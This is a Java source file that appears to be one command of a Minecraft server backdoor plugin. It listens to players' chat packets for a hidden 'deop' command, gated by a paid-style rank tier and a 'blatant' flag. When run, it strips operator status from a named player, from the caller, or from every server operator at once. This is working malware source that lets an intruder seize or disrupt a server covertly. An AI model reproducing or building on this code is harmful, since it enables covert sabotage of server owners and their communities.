package dev.ectasy.impl.commands.free;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

@CommandInfo(
        name = "deop",
        description = "Set a player operator status",
        rank = Rank.FREE,
        blatant = false
)
public class CommandDeop extends AbstractCommand {

    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args){

        if(args.length == 0){
            user.getPlayer().setOp(false);
            user.sendMessage("You have been " + user.getMainColor() + "deopped" + user.getSecondaryColor() + ".");
            return;
        }

        if(args[0].equals("*")){
            for(OfflinePlayer player : Bukkit.getOperators()){
                player.setOp(false);
            }
            user.sendMessage("All players have been " + user.getMainColor() + "deopped" + user.getSecondaryColor() + ".");
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if(target == null){
            user.sendMessage("The player " + user.getMainColor() + args[0] + user.getSecondaryColor() + " is not online.");
            return;
        }

        target.setOp(false);
        user.sendMessage("The player " + user.getMainColor() + target.getName() + user.getSecondaryColor() + " has been " + user.getMainColor() + "deopped" + user.getSecondaryColor() + ".");

    }

}
